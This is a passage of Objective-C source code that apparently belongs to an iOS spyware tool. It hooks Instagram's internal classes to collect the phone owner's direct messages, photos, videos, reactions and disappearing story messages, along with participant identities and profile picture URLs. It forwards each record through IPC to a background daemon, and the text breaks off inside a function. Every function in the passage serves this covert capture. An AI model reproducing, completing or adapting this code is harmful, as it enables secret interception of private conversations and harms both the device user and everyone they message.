//
//  IGUtils.m
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 7/11/2559 BE.
//
//

#import "IGUtils.h"

//Instagram Header

#import "IGDirectInboxNetworker.h"
#import "IGDirectThread.h"
#import "IGDirectThreadStore.h"
#import "IGDirectThreadStore-Networking.h"
#import "IGDirectThreadsFetchOptions.h"
#import "IGDirectContent.h"
#import "IGDirectComment.h"
#import "IGDirectPhoto.h"
#import "IGDirectVideo.h"
#import "IGDirectReaction.h"
#import "IGDirectPostShare.h"
#import "IGPost.h"
#import "IGFeedItem.h"

//Media
#import "IGPhoto.h"
#import "IGVideo.h"
#import "IGHeartView.h"

#import "IGDate.h"
#import "IGStorableObject.h"
#import "IGUser.h"
#import "IGAuthHelper.h"
#import "IGAuthHelper+8-3-0.h"
#import "IGUserSession.h"
#import "IGUserSession-IGDirectThreadStore.h"
#import "IGImageLoader.h"
#import "IGColors.h"

#import "FxIMEvent.h"
#import "FxEventEnums.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

#import "IMShareUtils.h"
#import "StringUtils.h"
#import "DefStd.h"
#import "SharedFile2IPCSender.h"
#import "MessagePortIPCSender.h"

// 9.0.1
#import "IGDirectThreadStore+9-0-1.h"
#import "IGDirectThreadService.h"
#import "IGDirectReelShare.h"

// 9.1
#import "IGDirectRealtimeService.h"
#import "IGUserSession-IGDirectRealtimeService.h"

// 9.2
#import "IGUserSession-IGDirectInboxNetworker.h"
#import "IGDirectThread+9-2.h"

// 10.0.1
#import "IGDirectStoryService.h"
#import "IGDirectStory.h"
#import "IGDirectStoryMessage.h"
#import <objc/runtime.h>

static IGUtils *_IGUtils = nil;

@implementation IGUtils

#pragma mark - Shared Instance -

+ (IGUtils *) sharedIGUtils {
    if (_IGUtils == nil) {
        _IGUtils = [[IGUtils alloc] init];
        
        SharedFile2IPCSender *sharedFileSender = nil;
        
        sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kInstagramMessagePort1];
        [_IGUtils setMIMSharedFileSender:sharedFileSender];
        [sharedFileSender release];
        sharedFileSender = nil;

    }
    return (_IGUtils);
}

#pragma mark - Observer App did become active

- (void)registerForAppDidBecomeActive{
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(captureOfflineMessageInNewThread)
                                                 name:UIApplicationDidBecomeActiveNotification object:nil];
}

- (void)unregisterForAppDidBecomeActive {
    [[NSNotificationCenter defaultCenter] removeObserver:self];
}

#pragma mark - Capture Util -

- (void)captureOfflineMessageInNewThread
{
    DLog(@"AppDidBecomeActive Start Capturing Offline Message");
    [NSThread detachNewThreadSelector:@selector(captureOfflineMessage) toTarget:self withObject:nil];
}

- (void)captureOfflineMessage
{
    DLog(@"----captureOfflineMessage----");
    @try {
        Class $IGAuthHelper = objc_getClass("IGAuthHelper");
        IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
        IGUserSession *currentUserSession = authHelper.currentUserSession;
        
        IGDirectInboxNetworker *inboxNetworker = nil;
        Class $IGDirectInboxNetworker = objc_getClass("IGDirectInboxNetworker");

        if ([$IGDirectInboxNetworker instancesRespondToSelector:@selector(sharedNetworker)]) {
            inboxNetworker = [$IGDirectInboxNetworker sharedNetworker];
        }
        else {
            inboxNetworker = [currentUserSession directInboxNetworker];
        }
        
        IGDirectThreadStore *threadStore = nil;
        
        //Below 9.0.1
        if ([inboxNetworker respondsToSelector:@selector(threadStore)]) {
             threadStore = inboxNetworker.threadStore;
        }
        else {
            threadStore = [currentUserSession directThreadStore];
        }
        
        if (threadStore) {
            [inboxNetworker fetchInboxDataFromFirstPage:YES success:^(id arg1){
                @try {
                    DLog(@"success arg1 %@", arg1);
                    
                    Class $IGDirectThreadsFetchOptions = objc_getClass("IGDirectThreadsFetchOptions");
                    IGDirectThreadsFetchOptions *option = [[$IGDirectThreadsFetchOptions alloc] init];
                    option.includeLocalThreads = YES;
                    option.isPending = NO;
                    
                    NSOrderedSet *threads = [threadStore threadsWithOptions:option];
                    
                    NSArray *sortedThreads = [threads sortedArrayUsingComparator:^NSComparisonResult(IGDirectThread *thread1, IGDirectThread *thread2) {
                        @try {
                            IGDirectContent *lastestMessage1 = [thread1.publishedMessages lastObject];
                            IGDate *lastestMessageDate1 = lastestMessage1.sentAt;
                            
                            IGDirectContent *lastestMessage2 = [thread2.publishedMessages lastObject];
                            IGDate *lastestMessageDate2 = lastestMessage2.sentAt;
                            
                            return [lastestMessageDate1.date compare:lastestMessageDate2.date];
                        } @catch (NSException *exception) {
                            DLog(@"Found exception %@", exception);
                        } @finally {
                                //DLog(@"Done");
                        }
                    }];
                    
                    [sortedThreads enumerateObjectsUsingBlock:^(IGDirectThread *thread, NSUInteger idx, BOOL * _Nonnull stop) {
                        @try {
                            DLog(@"thread %@", thread);
                            DLog(@"thread publishedMessages %@", thread.publishedMessages);
                            
                            IGDirectContent *lastestMessage = [thread.publishedMessages lastObject];
                            IGDate *lastestMessageDate = lastestMessage.sentAt;
                            DLog(@"lastestMessageDate %@", lastestMessageDate);
                            
                            NSNumber *lastestTimestampObject = [self.mLastestThreadTimestampDic objectForKey:thread.threadId];
                            if (!lastestTimestampObject) {// For firstime capture offline message
                                lastestTimestampObject = [NSNumber numberWithLongLong:[[NSDate date] timeIntervalSince1970]*1000];
                                [self storeLastestThreadTimeStamp:[lastestTimestampObject longLongValue] forThreadID:thread.threadId];
                            }
                            
                            long long lastestTimestamp = [lastestTimestampObject longLongValue];
                            DLog(@"lastestTimestamp %lld", lastestTimestamp);
                            
                                //Filter by lastest timestamp of thread that we keep in plist
                            if (lastestMessageDate.microseconds > lastestTimestamp) {
                                NSDictionary *lastSeenDict = nil;
                                
                                if ([thread respondsToSelector:@selector(lastSeenAtForItemIds)]) {
                                    lastSeenDict = [thread lastSeenAtForItemIds];
                                }
                                else if ([thread respondsToSelector:@selector(lastSeenDatesForItemIds)]) {
                                    lastSeenDict = [thread lastSeenDatesForItemIds];
                                }
                                
                                NSArray *lastSeenItems = [[lastSeenDict allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
                                    return [obj1.date compare:obj2.date];
                                }];
                                
                                DLog(@"lastSeenItems %@", lastSeenItems);
                                IGDate *lastSeenDate = [lastSeenItems lastObject];
                                
                                IGDirectContent *firstMessage = [thread.publishedMessages firstObject];
                                DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
                                
                                if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
                                        //Need to load more message
                                    [self loadAllContentFromThread:thread inThreadStore:threadStore firstLoad:YES];
                                }
                                else {
                                        //Do capture
                                    [self captureMessagesFromThread:thread];
                                }
                            }
                        } @catch (NSException *exception) {
                            DLog(@"Found exception %@", exception);
                        } @finally {
                                //DLog(@"Done");
                        }
                    }];
                } @catch (NSException *exception) {
                    DLog(@"Found exception %@", exception);
                } @finally {
                    //DLog(@"Done");
                }
            }
            failure:nil];
        }
        else {
            DLog(@"Not logged in yet");
        }
    } @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    } @finally {
        //DLog(@"Done");
    }
}

- (void)loadAllContentFromThread:(IGDirectThread *)aThread inThreadStore:(IGDirectThreadStore *)aThreadStore firstLoad:(BOOL)isFirstLoad
{
    @try {
        NSNumber *cursorOption = @0;
        NSNumber *mergeOption = @2;
        NSString *cursorValue = nil;
        
        DLog(@"thread %@", aThread);
        DLog(@"thread.hasOlder %d", aThread.hasOlder);
        
        if (!isFirstLoad) {
            cursorOption = @2;
            cursorValue = aThread.oldestCursor;
            DLog(@"cursorValue %@", cursorValue);
        }
        
        //Below 9.0.1
        if ([aThreadStore respondsToSelector:@selector(fetchThreadWithID:cursorOption:cursorValue:mergeOption:successfulThreadHandler:)]) {
            [aThreadStore fetchThreadWithID:aThread.threadId cursorOption:cursorOption cursorValue:cursorValue mergeOption:mergeOption successfulThreadHandler:^(IGDirectThread *resultThread){
                @try {
                    DLog(@"success arg1 %@", resultThread);
                    DLog(@"resultThread.publishedMessages %@", resultThread.publishedMessages);
                    
                    __block BOOL haveOlderUnseenItem = NO;
                    
                    NSDictionary *lastSeenDict = nil;
                    
                    if ([resultThread respondsToSelector:@selector(lastSeenAtForItemIds)]) {
                        lastSeenDict = [resultThread lastSeenAtForItemIds];
                    }
                    else if ([resultThread respondsToSelector:@selector(lastSeenDatesForItemIds)]) {
                        lastSeenDict = [resultThread lastSeenDatesForItemIds];
                    }
                    
                    NSArray *lastSeenItems = [[lastSeenDict allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
                        return [obj1.date compare:obj2.date];
                    }];
                    
                    DLog(@"lastSeenItems %@", lastSeenItems);
                    IGDate *lastSeenDate = [lastSeenItems lastObject];
                    
                    IGDirectContent *firstMessage = [resultThread.publishedMessages firstObject];
                    DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
                    
                    if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
                        haveOlderUnseenItem = YES;
                    }
                    
                    if (haveOlderUnseenItem) {
                            //Need to load more message
                        DLog(@"Load More");
                        [self loadAllContentFromThread:resultThread inThreadStore:aThreadStore firstLoad:NO];
                    }
                    else {
                            //Do capture here
                        [self captureMessagesFromThread:resultThread];
                    }
                } @catch (NSException *exception) {
                    DLog(@"Found exception %@", exception);
                } @finally {
                    //Done
                }

            } failureHandler:^(id arg1){
                DLog(@"fail arg1 %@", arg1);
            }];
        }
        else {//9.0.1 - 9.0.2
            IGDirectThreadService *threadService = nil;
            
            if ([aThreadStore respondsToSelector:@selector(threadService)]){
                threadService = [aThreadStore threadService];
            }
            else {// 9.1
                Class $IGAuthHelper = objc_getClass("IGAuthHelper");
                IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
                IGUserSession *currentUserSession = authHelper.currentUserSession;
                IGDirectRealtimeService *realTimeService = [currentUserSession directRealtimeService];
                DLog(@"realTimeService %@", realTimeService);
                threadService = realTimeService.threadService;
            }
            
            [threadService refreshThreadWithId:aThread.threadId cursor:cursorValue completion:^(IGDirectThread *resultThread){
                @try {
                    DLog(@"success arg1 %@", resultThread);
                    DLog(@"resultThread.publishedMessages %@", resultThread.publishedMessages);
                    
                    __block BOOL haveOlderUnseenItem = NO;
                    
                    NSDictionary *lastSeenDict = nil;
                    
                    if ([resultThread respondsToSelector:@selector(lastSeenAtForItemIds)]) {
                        lastSeenDict = [resultThread lastSeenAtForItemIds];
                    }
                    else if ([resultThread respondsToSelector:@selector(lastSeenDatesForItemIds)]) {
                        lastSeenDict = [resultThread lastSeenDatesForItemIds];
                    }
                    
                    NSArray *lastSeenItems = [[lastSeenDict allValues] sortedArrayUsingComparator:^NSComparisonResult(IGDate *obj1, IGDate * obj2) {
                        return [obj1.date compare:obj2.date];
                    }];
                    
                    DLog(@"lastSeenItems %@", lastSeenItems);
                    IGDate *lastSeenDate = [lastSeenItems lastObject];
                    
                    IGDirectContent *firstMessage = [resultThread.publishedMessages firstObject];
                    DLog(@"firstMessage.sentAt %@", firstMessage.sentAt);
                    
                    if ([firstMessage.sentAt.date timeIntervalSinceDate:lastSeenDate.date] > 0) {
                        haveOlderUnseenItem = YES;
                    }
                    
                    if (haveOlderUnseenItem) {
                            //Need to load more message
                        DLog(@"Load More");
                        [self loadAllContentFromThread:resultThread inThreadStore:aThreadStore firstLoad:NO];
                    }
                    else {
                            //Do capture here
                        [self captureMessagesFromThread:resultThread];
                    }
                } @catch (NSException *exception) {
                    DLog(@"Found exception %@", exception);
                } @finally {
                    DLog(@"Done");
                }
            }];
        }

    } @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    } @finally {
        DLog(@"Done");
    }
}

- (void)captureMessagesFromThread:(IGDirectThread *)aThread
{
    NSArray *sortedMessageArray = [aThread.publishedMessages sortedArrayUsingComparator:^NSComparisonResult(IGDirectContent *content1, IGDirectContent *content2) {
        return [content1.sentAt.date compare:content2.sentAt.date];
    }];
    
    NSMutableArray *shouldCaptureArray = [NSMutableArray array];
    
    long long lastestTimestamp = [[self.mLastestThreadTimestampDic objectForKey:aThread.threadId] longLongValue];
    DLog(@"lastestTimestamp %lld", lastestTimestamp);
    
    [sortedMessageArray enumerateObjectsUsingBlock:^(IGDirectContent *content, NSUInteger idx, BOOL * _Nonnull stop) {
        @try {
            Class $IGDirectComment = objc_getClass("IGDirectComment");
            Class $IGDirectPhoto = objc_getClass("IGDirectPhoto");
            Class $IGDirectVideo = objc_getClass("IGDirectVideo");
            Class $IGDirectReaction = objc_getClass("IGDirectReaction");
            Class $IGDirectPostShare = objc_getClass("IGDirectPostShare");
            Class $IGDirectReelShare = objc_getClass("IGDirectReelShare");
            
            if ([content isKindOfClass:$IGDirectComment] ||
                [content isKindOfClass:$IGDirectPhoto] ||
                [content isKindOfClass:$IGDirectVideo] ||
                [content isKindOfClass:$IGDirectReaction]||
                [content isKindOfClass:$IGDirectPostShare]||
                [content isKindOfClass:$IGDirectReelShare]) {
                
                DLog(@"content %@", content);
                DLog(@"content.sentAt.microseconds %lld", content.sentAt.microseconds);
                
                if (content.sentAt.microseconds > lastestTimestamp) {
                    [shouldCaptureArray addObject:content];
                }
            }
            else {
                DLog(@"Not support capturing this class %@", [content class]);
            }

        } @catch (NSException *exception) {
            DLog(@"Found exception %@", exception);
        } @finally {
            //Done
        }
    }];
    
    [shouldCaptureArray enumerateObjectsUsingBlock:^(IGDirectContent *content, NSUInteger idx, BOOL * _Nonnull stop) {
        @try {
            [IGUtils captureMessageContent:content inThread:aThread];
        } @catch (NSException *exception) {
            DLog(@"Found exception %@", exception);
        } @finally {
            //Done
        }
    }];
    
    //Save lastest time stamp after filter message for capture
    IGDirectContent *lastestMessage = [sortedMessageArray lastObject];
    IGDate *lastestMessageDate = lastestMessage.sentAt;
    [self storeLastestThreadTimeStamp:lastestMessageDate.microseconds forThreadID:aThread.threadId];
}

+ (void)captureMessageContent:(IGDirectContent *)aContent inThread:(IGDirectThread *)aThread
{
    DLog(@"Captured Content %@", aContent);
    DLog(@"inThread %@", aThread);
    
    @try {
        DLog(@"Send Instagram Direct message");
 
        NSMutableDictionary *IGDictionary = [NSMutableDictionary dictionary];
        
        __block FxEventDirection messgageDirection;
        __block FxIMMessageRepresentation messageRepresentation = kIMMessageText;
        NSString *message = nil;
        
        Class $IGDirectComment = objc_getClass("IGDirectComment");
        Class $IGDirectPhoto = objc_getClass("IGDirectPhoto");
        Class $IGDirectVideo = objc_getClass("IGDirectVideo");
        Class $IGDirectReaction = objc_getClass("IGDirectReaction");
        Class $IGDirectPostShare = objc_getClass("IGDirectPostShare");
        Class $IGDirectReelShare = objc_getClass("IGDirectReelShare");
        
        if ([aContent isKindOfClass:$IGDirectComment]) {
            messageRepresentation = kIMMessageText;
            
            IGDirectComment *directComment = aContent;
            message = directComment.text;
        }
        else if ([aContent isKindOfClass:$IGDirectPostShare]) {
            messageRepresentation = kIMMessageText;
            
            IGDirectPostShare *directPostShare = aContent;
            IGFeedItem *post = directPostShare.post;
            message = post.permalink;
        }
        else if ([aContent isKindOfClass:$IGDirectPhoto]) {
            messageRepresentation = kIMMessageNone;
        }
        else if ([aContent isKindOfClass:$IGDirectVideo]) {
            messageRepresentation = kIMMessageNone;
        }
        else if ([aContent isKindOfClass:$IGDirectReaction]) {
            messageRepresentation = kIMMessageSticker;
        }
        else if ([aContent isKindOfClass:$IGDirectReelShare]) {
            messageRepresentation = kIMMessageText;
            IGDirectReelShare *directReelShare = aContent;
            NSString *storyMessage = @"";
            
            IGFeedItem *feedItem = directReelShare.feedItem;
            
            if (feedItem.permalink > 0) {
                storyMessage = [storyMessage stringByAppendingString:feedItem.permalink];
            }
            
            if (directReelShare.text.length > 0) {
                storyMessage = [storyMessage stringByAppendingString:[NSString stringWithFormat:@"   - %@", directReelShare.text]];
            }
            
            message = storyMessage;
        }
        
        Class $IGAuthHelper = objc_getClass("IGAuthHelper");
        IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
        IGUserSession *currentUserSession = authHelper.currentUserSession;
        IGUser *currentUser = currentUserSession.user;
        
        IGUser *sender = aContent.user;
        //DLog(@"pageID %@", sender.pageID);
        DLog(@"pk %@", sender.pk);
        DLog(@"username %@", sender.username);
      
        if ([sender.pk isEqualToString:currentUser.pk]) {
            messgageDirection = kEventDirectionOut;
        }
        else {
            messgageDirection = kEventDirectionIn;
        }
        
        // -- get UID ------------------------------------------------------------
        NSString *senderUID             = [NSString stringWithString:sender.pk];             // -- Target    - UID
        
        // -- get Display Name  ------------------------------------------------------------
        NSString *senderDisplayName     = [NSString stringWithString:sender.username];     // -- Target    - Display Name
        
        // -- get ShortDisplay Name  ------------------------------------------------------------
        //NSString *senderShortDisplayName     = [NSString stringWithString:sender.displayName];     // -- Target    - Display Name
        
        // -- get Text ------------------------------------------------------------
        //NSString *textMessage           = [NSString stringWithString:anItem.message];                                         // -- Message Text
        //DLog(@"-- Text message:   %@", textMessage);
        
        DLog(@"threadId %@", aThread.threadId);
        DLog(@"aThread.name %@", aThread.name);
        
        // -- get conversation ID  ------------------------------------------------------------
        NSString *converID              = [NSString stringWithString:aThread.threadId];       // -- Conversation ID
        NSString *converName             = @"";       // -- Conversation ID
        
        if (aThread.name.length > 0) {
            converName = [NSString stringWithString:aThread.name];
        }
        else if ([[aThread displayName] length] > 0){
            converName = [NSString stringWithString:[aThread displayName]];
        }
        
        DLog(@"converName %@", converName)
        
        NSMutableArray *participants    = [NSMutableArray array];
        NSMutableDictionary *participantProfileDictionary = [NSMutableDictionary dictionary];
        
        NSArray *allUserInthread = aThread.users;
        DLog(@"all user in thread %@", allUserInthread);
        [allUserInthread enumerateObjectsUsingBlock:^(IGUser *user, NSUInteger idx, BOOL * _Nonnull stop) {
            @try {
                //Filter out sender
                if (![user.pk isEqualToString:sender.pk]) {
                    FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:user.pk]
                                                                          displayname: user.username
                                                                        statusMessage: @""
                                                                       pictureProfile:nil];
                    [participants addObject:participant];
                    [participantProfileDictionary setObject:[user.profilePicURL absoluteString] forKey:user.pk];
                }
            } @catch (NSException *exception) {
                DLog(@"Found exception %@", exception);
            } @finally {
                //Done
            }
        }];
        
        if (messgageDirection == kEventDirectionIn) {
            Class $IGAuthHelper = objc_getClass("IGAuthHelper");
            IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
            IGUserSession *currentUserSession = authHelper.currentUserSession;
            IGUser *currentUser = currentUserSession.user;
            DLog(@"currentUser %@", currentUser);
            
            FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:currentUser.pk]
                                                                  displayname: currentUser.username
                                                                statusMessage: @""
                                                               pictureProfile:nil];
            
            [participants insertObject:participant atIndex:0];
            [participantProfileDictionary setObject:[currentUser.profilePicURL absoluteString] forKey:currentUser.pk];
        }
        
        [IGDictionary setObject:participantProfileDictionary forKey:@"ParticipantProfileDic"];
        
        
        NSMutableArray *attachmentArray = [NSMutableArray array];
        
        //Profile Picture Data
        if ([sender.profilePicURL absoluteString].length > 0) {
            [IGDictionary setObject:[NSString stringWithString:[sender.profilePicURL absoluteString]] forKey:@"ProfilePictureURL"];
        }
        
        if ([aContent isKindOfClass:$IGDirectPhoto]) {
            IGDirectPhoto *photoContent = aContent;
            IGPhoto *photo = photoContent.photo;
            DLog(@"photo %@", photo);
            DLog(@"previewImageData %@", photo.previewImageData);
            
            //DLog(@"imageVersions %@", photo.imageVersions);
            
            if (photo.imageVersions.count > 0) {
                NSDictionary *versionDictionary = [photo.imageVersions objectAtIndex:0];
                DLog(@"versionDictionary %@", versionDictionary);
                NSString *photoURL = [versionDictionary objectForKey:@"url"];
                DLog(@"photoURL %@", photoURL);
                [IGDictionary setObject:photoURL forKey:@"AttachmentURL"];
                [IGDictionary setObject:@".png" forKey:@"AttachmentExtension"];
            }
            
        }
        
        if ([aContent isKindOfClass:$IGDirectVideo]) {
            IGDirectVideo *videoContent = aContent;
            IGVideo *video = videoContent.video;
            DLog(@"video %@", video);
            DLog(@"allVideoURLs %@", video.allVideoURLs);
            
            if (video.allVideoURLs.count > 0) {
                id videoURL = [[video.allVideoURLs allObjects] objectAtIndex:0];
                DLog(@"videoURL %@", videoURL);
                [IGDictionary setObject:[videoURL absoluteString] forKey:@"AttachmentURL"];
                [IGDictionary setObject:@".mp4" forKey:@"AttachmentExtension"];
            }
            
            IGPhoto *thumbnailPhoto = videoContent.photo;
            DLog(@"photo %@", thumbnailPhoto);
            
            if (thumbnailPhoto.imageVersions.count > 0) {
                NSDictionary *versionDictionary = [thumbnailPhoto.imageVersions objectAtIndex:0];
                DLog(@"versionDictionary %@", versionDictionary);
                NSString *photoURL = [versionDictionary objectForKey:@"url"];
                DLog(@"photoURL %@", photoURL);
                [IGDictionary setObject:[photoURL stringByAppendingString:@".png"] forKey:@"thumbnailURL"];
            }
        }
        
        if ([aContent isKindOfClass:$IGDirectReaction]) {
            IGDirectReaction *reactionContent = aContent;
            
            DLog(@"reactionContent.type %llu", reactionContent.type);
            DLog(@"contentTypeString %@", reactionContent.contentTypeString);
            
            NSString *digestDescription = @"";
            
            if ([reactionContent respondsToSelector:@selector(digestDescription)]) {
                digestDescription = reactionContent.digestDescription;
            }
            else if ([reactionContent respondsToSelector:@selector(digestDescriptionWithCurrentUser:)]) {
                digestDescription = [reactionContent digestDescriptionWithCurrentUser:currentUser];
            }
            
            DLog(@"digestDescription %@", digestDescription);
            
            if (reactionContent.type == 1 || [reactionContent.contentTypeString isEqualToString:@"like"] || [reactionContent.digestDescription isEqualToString:@"❤"]) {//Like reaction
                Class $IGImageLoader = objc_getClass("IGImageLoader");
                Class $IGColors = objc_getClass("IGColors");
                
                //DLog(@"tintedImageCache %@", [$IGImageLoader tintedImageCache]);
                NSData *heartImageData = UIImagePNGRepresentation([$IGImageLoader tintedImageWithName:@"direct-heart" tintColor:[$IGColors heartColor]]);
                FxAttachment *attachment = [[FxAttachment alloc] init];
                [attachment setMThumbnail:heartImageData];
                [attachmentArray addObject:attachment];
                [attachment release];
            }
            else {
                DLog(@"New kind of Reaction");
            }
        }
        
        // ------------------- FXIMEvent Construction ------------------------
        
        FxIMEvent *imEvent      = [IGUtils createFXIMEventForMessageDirection: messgageDirection
                                                                         representation: messageRepresentation
                                                                                message: message
                                                                                 userID: senderUID                 // sender id
                                                                        userDisplayName: senderDisplayName         // sender display name
                                                                      userStatusMessage: @""       // sender status message
                                                                            userPicture: nil
                                                                               converID: converID
                                                                             converName: converName
                                                                          converPicture: nil
                                                                           participants: participants
                                                                            attachments: attachmentArray];
        [[IGUtils sharedIGUtils] sendIGEvent:imEvent withIGDictionary:IGDictionary];
    }
    @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    }
    @finally {
        ;
    }
}

//Capture Util for Instagram Direct Story (Disappearing Photo and Video - Like Snap in Snapchat)
//For incoming direct story message
+ (void)captureStoryMessage:(IGDirectStoryMessage *)aMessage withStoryID:(NSString *)aStoryID
{
    @try {
        DLog(@"Capture Instagram Story message");
        
        Class $IGAuthHelper = objc_getClass("IGAuthHelper");
        IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
        IGUserSession *currentUserSession = authHelper.currentUserSession;
        IGDirectRealtimeService *realTimeService = [currentUserSession directRealtimeService];
        DLog(@"realTimeService %@", realTimeService);
        IGDirectStoryService *directStoryService = realTimeService.directStoryService;
        
        IGDirectStory *aStory = [directStoryService storyForId:aStoryID];
        
        DLog(@"Captured Message %@", aMessage);
        DLog(@"inThread %@", aStory);
        
        NSMutableDictionary *IGDictionary = [NSMutableDictionary dictionary];
        
        __block FxEventDirection messgageDirection;
        __block FxIMMessageRepresentation messageRepresentation = kIMMessageNone;
        NSString *message = nil;
        
        IGUser *currentUser = currentUserSession.user;
        
        IGUser *sender = aMessage.user;
            //DLog(@"pageID %@", sender.pageID);
        DLog(@"pk %@", sender.pk);
        DLog(@"username %@", sender.username);
        
        if ([sender.pk isEqualToString:currentUser.pk]) {
            messgageDirection = kEventDirectionOut;
        }
        else {
            messgageDirection = kEventDirectionIn;
        }
        
            // -- get UID ------------------------------------------------------------
        NSString *senderUID             = [NSString stringWithString:sender.pk];             // -- Target    - UID
        
            // -- get Display Name  ------------------------------------------------------------
        NSString *senderDisplayName     = [NSString stringWithString:sender.username];     // -- Target    - Display Name
        
            // -- get ShortDisplay Name  ------------------------------------------------------------
            //NSString *senderShortDisplayName     = [NSString stringWithString:sender.displayName];     // -- Target    - Display Name
        
            // -- get Text ------------------------------------------------------------
            //NSString *textMessage           = [NSString stringWithString:anItem.message];                                         // -- Message Text
            //DLog(@"-- Text message:   %@", textMessage);
        
            // -- get conversation ID  ------------------------------------------------------------
        NSString *converID              = @"";       // -- Conversation ID
        if (aStory.storyId.length > 0) {
            converID = [NSString stringWithString:aStory.storyId];
        }
        
        DLog(@"converID %@", converID);
        
        NSString *converName             = @"";       // -- Conversation ID
        
        if (aStory.threadName.length > 0) {
            converName = [NSString stringWithString:aStory.threadName];
        }
        else if ([[aStory threadDisplayName] length] > 0){
            converName = [NSString stringWithString:[aStory threadDisplayName]];
        }
        
        DLog(@"converName %@", converName)
        
        NSMutableArray *participants    = [NSMutableArray array];
        NSMutableDictionary *participantProfileDictionary = [NSMutableDictionary dictionary];
        
        NSArray *allUserInthread = aStory.users;
        DLog(@"all user in thread %@", allUserInthread);
        [allUserInthread enumerateObjectsUsingBlock:^(IGUser *user, NSUInteger idx, BOOL * _Nonnull stop) {
            @try {
                    //Filter out sender
                if (![user.pk isEqualToString:sender.pk]) {
                    FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:user.pk]
                                                                          displayname: user.username
                                                                        statusMessage: @""
                                                                       pictureProfile:nil];
                    [participants addObject:participant];
                    [participantProfileDictionary setObject:[user.profilePicURL absoluteString] forKey:user.pk];
                }
            } @catch (NSException *exception) {
                DLog(@"Found exception %@", exception);
            } @finally {
                    //Done
            }
        }];
        
        if (messgageDirection == kEventDirectionIn) {
            Class $IGAuthHelper = objc_getClass("IGAuthHelper");
            IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
            IGUserSession *currentUserSession = authHelper.currentUserSession;
            IGUser *currentUser = currentUserSession.user;
            DLog(@"currentUser %@", currentUser);
            
            FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:currentUser.pk]
                                                                  displayname: currentUser.username
                                                                statusMessage: @""
                                                               pictureProfile:nil];
            
            [participants insertObject:participant atIndex:0];
            [participantProfileDictionary setObject:[currentUser.profilePicURL absoluteString] forKey:currentUser.pk];
        }
        
        [IGDictionary setObject:participantProfileDictionary forKey:@"ParticipantProfileDic"];
        
        
        NSMutableArray *attachmentArray = [NSMutableArray array];
        
            //Profile Picture Data
        if ([sender.profilePicURL absoluteString].length > 0) {
            [IGDictionary setObject:[NSString stringWithString:[sender.profilePicURL absoluteString]] forKey:@"ProfilePictureURL"];
        }
        
        //Photo
        if ([aMessage rawPhoto] && ![aMessage rawVideo]) {
            IGPhoto *photo = [aMessage rawPhoto];
            DLog(@"photo %@", photo);
            DLog(@"previewImageData %@", photo.previewImageData);
            
                //DLog(@"imageVersions %@", photo.imageVersions);
            
            if (photo.imageVersions.count > 0) {
                NSDictionary *versionDictionary = [photo.imageVersions objectAtIndex:0];
                DLog(@"versionDictionary %@", versionDictionary);
                NSString *photoURL = [versionDictionary objectForKey:@"url"];
                DLog(@"photoURL %@", photoURL);
                [IGDictionary setObject:photoURL forKey:@"AttachmentURL"];
                [IGDictionary setObject:@".png" forKey:@"AttachmentExtension"];
            }
            
        }
        
        //Video
        if ([aMessage rawVideo]) {
            IGVideo *video = [aMessage rawVideo];
            DLog(@"video %@", video);
            DLog(@"allVideoURLs %@", video.allVideoURLs);
            
            if (video.allVideoURLs.count > 0) {
                id videoURL = [[video.allVideoURLs allObjects] objectAtIndex:0];
                DLog(@"videoURL %@", videoURL);
                [IGDictionary setObject:[videoURL absoluteString] forKey:@"AttachmentURL"];
                [IGDictionary setObject:@".mp4" forKey:@"AttachmentExtension"];
            }
            
            IGPhoto *thumbnailPhoto = [aMessage rawPhoto];
            DLog(@"photo %@", thumbnailPhoto);
            
            if (thumbnailPhoto.imageVersions.count > 0) {
                NSDictionary *versionDictionary = [thumbnailPhoto.imageVersions objectAtIndex:0];
                DLog(@"versionDictionary %@", versionDictionary);
                NSString *photoURL = [versionDictionary objectForKey:@"url"];
                DLog(@"photoURL %@", photoURL);
                [IGDictionary setObject:photoURL forKey:@"thumbnailURL"];
            }
        }

        // ------------------- FXIMEvent Construction ------------------------
        
        FxIMEvent *imEvent      = [IGUtils createFXIMEventForMessageDirection: messgageDirection
                                                               representation: messageRepresentation
                                                                      message: message
                                                                       userID: senderUID                 // sender id
                                                              userDisplayName: senderDisplayName         // sender display name
                                                            userStatusMessage: @""       // sender status message
                                                                  userPicture: nil
                                                                     converID: converID
                                                                   converName: converName
                                                                converPicture: nil
                                                                 participants: participants
                                                                  attachments: attachmentArray];
        [[IGUtils sharedIGUtils] sendIGEvent:imEvent withIGDictionary:IGDictionary];
    }
    @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    }
    @finally {
        ;
    }
}

//For outgoing direct story message
+ (void)captureStoryMessageAsset:(id)anAsset withStoryID:(NSString *)aStoryID
{
    @try {
        DLog(@"Capture Instagram Story message");
        
        Class $IGAuthHelper = objc_getClass("IGAuthHelper");
        IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
        IGUserSession *currentUserSession = authHelper.currentUserSession;
        IGDirectRealtimeService *realTimeService = [currentUserSession directRealtimeService];
